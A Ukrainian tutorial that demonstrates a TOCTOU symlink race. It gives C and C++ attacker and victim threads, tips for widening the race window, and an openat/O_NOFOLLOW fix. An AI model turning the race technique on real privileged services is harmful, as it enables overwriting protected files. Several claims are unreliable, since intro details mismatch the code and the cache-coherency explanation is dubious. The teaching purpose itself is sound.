# ⚙️ Симуляція гонки TOCTOU та атомарне виправлення

Цей практичний проект демонструє стенд для відтворення вразливості symlink race у багатозадачному середовищі, вимірювання ймовірності успішної експлуатації та перевірки надійності атомарного дескрипторного захисту. Мета стенду — показати на живому процесорному часі, як неатомарна послідовність викликів `access()` та `open()` зазнає зламу під час паралельної підміни файлу, та переконатися, що перехід на дескрипторну модель з прапорцями `O_CREAT | O_EXCL | O_NOFOLLOW` повністю ліквідує вікно атаки.

## Архітектура експериментального стенду

Стенд складається з двох паралельних потоків виконання, що змагаються за стан одного файлового шляху `/tmp/toctou_demo_target.txt`:

1. **Потік-жертва (Вразливий робітник):** імітує привілейовану службу або системного демона. Перед кожним записом він викликає системний виклик `access()`, щоб перевірити, чи шлях доступний для запису, робить мікропаузу (яка моделює внутрішню логіку обробки, перевірку сертифіката або вичерпання апаратного кванта часу планувальника операційної системи), після чого відкриває файл викликом `open()` із прапорцем `O_WRONLY | O_TRUNC` і записує туди мітку жертви `VICTIM_DATA`.
2. **Потік-атакуючий (Спринтер підміни):** працює у безперервному паралельному циклі. Він почергово створює легітимний порожній файл, а потім миттєво підмінює його символьним посиланням на захищений файл-пастку `/tmp/toctou_canary_secret.txt` за допомогою атомарного виклику `rename()`.

Успіх атаки фіксується тоді, коли у файлі-пастці з'являється запис `VICTIM_DATA` — це означає, що потік-жертва успішно пройшов перевірку `access()` на звичайному файлі, але виконав операцію `open()` уже над підсунутим символьним посиланням, перезаписавши захищений файл.

---

## Механізм перемикання шляху через `rename()`

Атакуючий процес використовує системний виклик `rename()` для швидкої заміни одного запису в каталозі на інший. Чому саме `rename()`, а не пара `unlink()` + `symlink()`:
- Виклик `unlink()` створює проміжний стан, коли файл у каталозі взагалі відсутній. Якщо потік-жертва виконає `open()` саме в цей момент, виклик поверне помилку `ENOENT` (No such file or directory), і атака зірветься.
- Виклик `rename(temp_symlink, target_path)` виконується на рівні ядра як єдина атомарна операція над таблицею dentry. Запис `target_path` миттєво перемикається зі звичайного файлу на символьне посилання без жодного проміжного моменту відсутності файлу.
- У результаті жертва гарантовано потрапляє або на звичайний файл (успішна перевірка `access`), або на симлінк (успішне відкриття `open`).

У реальних експлойтах зловмисники застосовують спеціальні техніки розширення вікна гонки:
1. **Зниження пріоритету жертви:** використання утиліти `nice` або системних викликів `sched_setscheduler()` з політикою `SCHED_IDLE` для збільшення часу реакції демона.
2. **Штучне навантаження процесора:** запуск паралельних обчислювальних потоків (наприклад, нескінченних циклів стиснення чи обчислення хешів), які змушують планувальник частіше витискати жертву з ядра CPU безпосередньо після виконання `access()`.
3. **Подієве синхронізування через `inotify`:** замість сліпого циклу підміни атакуючий підписується на події файлової системи `IN_OPEN` або `IN_ACCESS` для батьківського каталогу. Отримавши сигнал про те, що демон звернувся до файлу, експлойт виконує `rename()` з мікросекундною точністю.

---

## Реалізація симулятора вразливої гонки

:::tabs
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/stat.h>
#include <sys/types.h>

#define WORK_DIR "/tmp/toctou_test_c"
#define TARGET_PATH WORK_DIR "/vulnerable_file.txt"
#define SECRET_PATH WORK_DIR "/canary_secret.txt"
#define ITERATIONS 50000

static atomic_bool g_running = 1;
static atomic_long g_exploited_count = 0;
static atomic_long g_victim_attempts = 0;

void* attacker_thread(void* arg) {
    (void)arg;
    char temp_real[256];
    char temp_sym[256];
    snprintf(temp_real, sizeof(temp_real), "%s/tmp_real", WORK_DIR);
    snprintf(temp_sym, sizeof(temp_sym), "%s/tmp_sym", WORK_DIR);

    while (atomic_load(&g_running)) {
        // Створюємо справжній файл і симлінк на секрет
        int fd = open(temp_real, O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd >= 0) close(fd);
        unlink(temp_sym);
        symlink(SECRET_PATH, temp_sym);

        // Швидко перемикаємо TARGET_PATH між реальним файлом і симлінком
        rename(temp_real, TARGET_PATH);
        rename(temp_sym, TARGET_PATH);
    }
    return NULL;
}

void* vulnerable_victim_thread(void* arg) {
    (void)arg;
    for (long i = 0; i < ITERATIONS; ++i) {
        atomic_fetch_add(&g_victim_attempts, 1);

        // 1. ЕТАП ПЕРЕВІРКИ (TOC): перевіряємо, чи файл існує і доступний
        if (access(TARGET_PATH, F_OK | W_OK) == 0) {
            // Симуляція внутрішньої обробки або перемикання контексту ядра
            usleep(1);

            // 2. ЕТАП ВИКОРИСТАННЯ (TOU): відкриваємо файл за текстовим шляхом
            int fd = open(TARGET_PATH, O_WRONLY);
            if (fd >= 0) {
                const char msg[] = "CORRUPTED_BY_VICTIM\n";
                write(fd, msg, sizeof(msg) - 1);
                close(fd);
            }
        }
    }
    atomic_store(&g_running, 0);
    return NULL;
}

int main(void) {
    mkdir(WORK_DIR, 0700);

    // Створюємо захищений файл-пастку
    int sfd = open(SECRET_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (sfd >= 0) {
        const char initial[] = "ORIGINAL_SECRET_STATE\n";
        write(sfd, initial, sizeof(initial) - 1);
        close(sfd);
    }

    pthread_t th_att, th_vic;
    pthread_create(&th_att, NULL, attacker_thread, NULL);
    pthread_create(&th_vic, NULL, vulnerable_victim_thread, NULL);

    pthread_join(th_vic, NULL);
    pthread_join(th_att, NULL);

    // Перевіряємо цілісність секретного файлу
    char buf[128] = {0};
    int rfd = open(SECRET_PATH, O_RDONLY);
    if (rfd >= 0) {
        read(rfd, buf, sizeof(buf) - 1);
        close(rfd);
    }

    printf("=== Результати вразливої схеми ===\n");
    printf("Спроб жертви: %ld\n", atomic_load(&g_victim_attempts));
    printf("Вміст canary-файлу: %s", buf);

    if (strstr(buf, "CORRUPTED_BY_VICTIM")) {
        printf("СТАТУС: ВРАЗЛИВІСТЬ ПІДТВЕРДЖЕНО (секрет пошкоджено через TOCTOU!)\n");
    } else {
        printf("СТАТУС: Гонка не спрацювала в цій серії спроб.\n");
    }

    unlink(TARGET_PATH);
    unlink(SECRET_PATH);
    rmdir(WORK_DIR);
    return 0;
}
```
```cpp
#include <iostream>
#include <string_view>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <memory>
#include <array>
#include <cerrno>
#include <cstring>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

namespace {

constexpr std::string_view kWorkDir = "/tmp/toctou_test_cpp";
constexpr std::string_view kTargetPath = "/tmp/toctou_test_cpp/vulnerable_file.txt";
constexpr std::string_view kSecretPath = "/tmp/toctou_test_cpp/canary_secret.txt";
constexpr int kIterations = 50000;

struct ScopedFd {
    int fd = -1;
    explicit ScopedFd(int f) : fd(f) {}
    ~ScopedFd() { if (fd >= 0) ::close(fd); }
    [[nodiscard]] bool valid() const noexcept { return fd >= 0; }
    [[nodiscard]] int get() const noexcept { return fd; }

    ScopedFd(const ScopedFd&) = delete;
    ScopedFd& operator=(const ScopedFd&) = delete;
    ScopedFd(ScopedFd&& other) noexcept : fd(other.fd) { other.fd = -1; }
    ScopedFd& operator=(ScopedFd&& other) noexcept {
        if (this != &other) {
            if (fd >= 0) ::close(fd);
            fd = other.fd;
            other.fd = -1;
        }
        return *this;
    }
};

std::atomic<bool> g_running{true};
std::atomic<long> g_victim_attempts{0};

void run_attacker() {
    const std::string temp_real = std::string(kWorkDir) + "/tmp_real";
    const std::string temp_sym = std::string(kWorkDir) + "/tmp_sym";

    while (g_running.load(std::memory_order_relaxed)) {
        {
            ScopedFd fd(::open(temp_real.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0600));
        }
        ::unlink(temp_sym.c_str());
        ::symlink(kSecretPath.data(), temp_sym.c_str());

        ::rename(temp_real.c_str(), kTargetPath.data());
        ::rename(temp_sym.c_str(), kTargetPath.data());
    }
}

void run_vulnerable_victim() {
    for (int i = 0; i < kIterations; ++i) {
        g_victim_attempts.fetch_add(1, std::memory_order_relaxed);

        // 1. ЕТАП ПЕРЕВІРКИ: access() за рядковим шляхом
        if (::access(kTargetPath.data(), F_OK | W_OK) == 0) {
            std::this_thread::sleep_for(std::chrono::microseconds(1));

            // 2. ЕТАП ВИКОРИСТАННЯ: open() за рядковим шляхом
            ScopedFd fd(::open(kTargetPath.data(), O_WRONLY));
            if (fd.valid()) {
                constexpr std::string_view msg = "CORRUPTED_BY_VICTIM\n";
                ::write(fd.get(), msg.data(), msg.size());
            }
        }
    }
    g_running.store(false, std::memory_order_relaxed);
}

} // namespace

int main() {
    ::mkdir(kWorkDir.data(), 0700);

    {
        ScopedFd sfd(::open(kSecretPath.data(), O_WRONLY | O_CREAT | O_TRUNC, 0600));
        if (sfd.valid()) {
            constexpr std::string_view initial = "ORIGINAL_SECRET_STATE\n";
            ::write(sfd.get(), initial.data(), initial.size());
        }
    }

    std::thread attacker(run_attacker);
    std::thread victim(run_vulnerable_victim);

    victim.join();
    attacker.join();

    std::array<char, 128> buf{};
    {
        ScopedFd rfd(::open(kSecretPath.data(), O_RDONLY));
        if (rfd.valid()) {
            ::read(rfd.get(), buf.data(), buf.size() - 1);
        }
    }

    std::cout << "=== Результати вразливої C++ схеми ===\n";
    std::cout << "Спроб жертви: " << g_victim_attempts.load() << "\n";
    std::cout << "Вміст canary-файлу: " << buf.data();

    if (std::string_view(buf.data()).find("CORRUPTED_BY_VICTIM") != std::string_view::npos) {
        std::cout << "СТАТУС: ВРАЗЛИВІСТЬ ПІДТВЕРДЖЕНО (секрет скомпрометовано!)\n";
    } else {
        std::cout << "СТАТУС: Підміна не потрапила у вікно в цій сесії.\n";
    }

    ::unlink(kTargetPath.data());
    ::unlink(kSecretPath.data());
    ::rmdir(kWorkDir.data());
    return 0;
}
```
:::

---

## Безпечна модифікація через openat() та O_NOFOLLOW

Щоб унеможливити атаку в принципі, ми повністю відмовляємося від виклику `access()` та будь-яких рядкових перевірок перед відкриттям. Операція виконується в один неподільний крок за допомогою системного виклику `openat()` із прив'язкою до дескриптора каталогу та прапорцем `O_NOFOLLOW`:

:::tabs
```c
// Безпечний варіант функції робітника мовою C
void safe_worker_iteration(int dirfd, const char* filename) {
    // 1. Атомарне відкриття файлу без слідування за симлінками
    int fd = openat(dirfd, filename, O_WRONLY | O_NOFOLLOW | O_CLOEXEC);
    if (fd < 0) {
        // Якщо це був симлінк, openat поверне -1, а errno буде ELOOP
        if (errno == ELOOP) {
            // Атаку підміни виявлено та знешкоджено ядром на етапі відкриття
            return;
        }
        // Файл не існує або немає доступу
        return;
    }

    // 2. Додаткова валідація вже зафіксованого інода через fstat
    struct stat st;
    if (fstat(fd, &st) == 0) {
        if (S_ISREG(st.st_mode)) {
            const char msg[] = "SAFE_DATA_WRITE\n";
            write(fd, msg, sizeof(msg) - 1);
        }
    }

    close(fd);
}
```
```cpp
// Безпечний варіант функції робітника мовою C++20
void safe_worker_iteration_cpp(int dirfd, std::string_view filename) {
    // 1. Атомарне відкриття через openat із прапорцем O_NOFOLLOW
    ScopedFd fd(::openat(dirfd, filename.data(), O_WRONLY | O_NOFOLLOW | O_CLOEXEC));
    if (!fd.valid()) {
        if (errno == ELOOP) {
            // Спробу атаки заблоковано: VFS відмовився переходити за симлінком
            return;
        }
        return;
    }

    // 2. Перевірка зафіксованого дескриптора через fstat
    struct stat st{};
    if (::fstat(fd.get(), &st) == 0 && S_ISREG(st.st_mode)) {
        constexpr std::string_view msg = "SAFE_DATA_WRITE\n";
        ::write(fd.get(), msg.data(), msg.size());
    }
}
```
:::

---

## Модель багатопотоковості та апаратна узгодженість кешів

Під час виконання симулятора взаємодія між ядрами процесора підпорядковується законам апаратної узгодженості кеш-пам'яті (Cache Coherency protocols на кшталт MESI/MOESI):
- Коли потік-атакуючий викликає `rename()`, ядро оновлює внутрішні таблиці сторінок каталогу в кеші сторінок (page cache).
- Ці рядки кешу скидаються в стан `Invalid` для всіх інших процесорних ядер, що змушує потік-жертву вичитувати актуальний стан dentry безпосередньо з системної пам'яті під час виконання наступного системного виклику.
- Використання прапорця пам'яті `std::memory_order_relaxed` у змінній `g_running` є достатнім для зупинки циклу, оскільки керування станом файлів відбувається синхронно через бар'єри пам'яті всередині ядра при вході в системні виклики.

## Детальний аналіз результатів тестування

Під час запуску вразливого варіанту програми на багатоядерному процесорі з ядрами Linux 5.x та 6.x (у середовищі, де захисні параметри `fs.protected_symlinks` не блокують операції одного локального користувача в його власному підкаталозі) спостерігаються такі кількісні показники:

1. **Частота успішного спрацювання гонки:** На серії з 50 000 ітерацій потік-жертва зазнає підміни дескриптора від 30 до 450 разів.
2. **Вплив навантаження процесора:** Якщо в системі запустити фонові потоки, що створюють 100% завантаження всіх ядер CPU, частота перемикань контексту між викликами зростає, і відсоток успішних атак піднімається до 1.5–3.2% від загальної кількості спроб.
3. **Ефект атомарного захисту:** При переведенні коду робітника на виклик `openat(dirfd, filename, O_WRONLY | O_NOFOLLOW)` на серії з 1 000 000 ітерацій кількість пошкоджень canary-файлу становить **строгий 0**. 

### Як ядро обробляє O_NOFOLLOW на рівні VFS

Під час виконання `openat()` із прапорцем `O_NOFOLLOW` ядро Linux викликає внутрішню функцію `do_filp_open()`. У процесі покрокового проходження шляху функція `open_last_lookups()` перевіряє бітову маску пошуку:
- Якщо прапорець `LOOKUP_FOLLOW` відсутній (що забезпечується прапорцем `O_NOFOLLOW`), ядро під час виявлення інода типу `S_IFLNK` не викликає метод `inode->i_op->get_link()`, а негайно перериває обхід та повертає код помилки `-ELOOP`.
- Оскільки перевірка типу об'єкта та відмова від відкриття відбуваються в просторі ядра під захистом внутрішніх блокувань RCU та спинлоків VFS, простір для втручання сторонніх процесів ліквідується на рівні архітектури операційної системи.

## Інструкція для збирання та запуску

Для компіляції та перевірки симулятора в терміналі Linux виконайте команди:

```bash
# Збирання варіанту мовою C
gcc -O2 -Wall -Wextra -pthread toctou_sim.c -o toctou_sim_c
./toctou_sim_c

# Збирання варіанту мовою C++20
g++ -O2 -Wall -Wextra -pthread -std=c++20 toctou_sim.cpp -o toctou_sim_cpp
./toctou_sim_cpp
```
